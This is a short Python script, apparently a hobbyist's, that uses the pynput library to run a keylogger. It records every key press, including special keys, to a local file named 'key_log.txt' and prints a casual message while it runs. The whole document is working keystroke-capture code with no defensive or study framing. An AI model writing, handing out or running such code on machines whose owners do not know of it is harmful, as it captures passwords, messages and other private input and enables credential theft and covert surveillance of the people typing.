from pynput import keyboard

# File to save logged keys
log_file = "key_log.txt"

# Function to write keys to a file
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # For special keys like space, enter, etc.
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Listener setup
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... lets see what it says.I hope it doesn't say anything bad and works as expected.")
    listener.join()
